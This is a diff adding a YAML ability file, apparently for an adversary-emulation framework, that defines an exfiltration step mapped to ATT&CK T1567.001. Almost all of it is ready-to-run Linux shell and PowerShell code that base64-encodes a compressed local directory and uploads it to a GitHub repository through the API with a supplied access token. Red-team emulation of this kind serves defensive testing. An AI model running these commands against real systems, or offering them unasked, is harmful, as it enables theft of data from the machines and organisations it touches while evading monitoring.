@@ -1,0 +1,56 @@
+- id: 4a1120a5-971c-457f-bb07-60641b4723fd
+  name: Exfil Compressed Archive to Github Repository
+  description: This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.001
+    name: Exfiltration to Code Repository
+  platforms:
+    linux: # https://docs.github.com/en/rest/reference/repos#contents
+      sh:
+        command: |
+          GHUser="#{github.user.name}";
+          GHRepo="#{github.repository.name}";
+          GHPAT="#{github.access.token}";
+          GHBranch='#{github.repository.branch}';
+          LocalFile='#{host.dir.compress}';
+          Header="Authorization: token $GHPAT";
+          RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
+          echo "{\"message\":\"Committed $RemoteName\", \"branch\":\"$GHBranch\", \"content\":\"" >/tmp/b64;
+          base64 -w 0 $LocalFile >>/tmp/b64;
+          echo "\"}" >>/tmp/b64;
+          content=$(curl -s -X PUT -H "Accept: application/vnd.github.v3+json" -H "$Header" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);
+          rm /tmp/b64;
+    windows:
+      psh,pwsh: # https://docs.github.com/en/rest/reference/repos#contents
+        command: |
+          $GHUser = "#{github.user.name}";
+          $GHRepo = "#{github.repository.name}";
+          $GHPAT = "#{github.access.token}";
+          $GHBranch = '#{github.repository.branch}';
+          $token = $GHUser + ":" + $GHPAT;
+          $basetoken = [System.Convert]::ToBase64String([char[]]$token);
+          $Headers = @{
+              Authorization = 'Basic {0}' -f $basetoken;
+          };
+          $file = (Get-Item #{host.dir.compress});
+          $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)";
+          $uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;
+
+          $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;
+          $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);
+          $Body = @{
+              path = $RemoteName;
+              branch = $GHBranch;
+              content = $Base64EncodedFileBytes;
+              encoding = 'base64';
+              message = "Committed " + $RemoteName;
+          } | ConvertTo-Json;
+          try {
+            $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;
+          } catch {
+            if ($PSItem -notmatch "but expected") { $PSItem; }
+          }
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+        - source: host.dir.compress
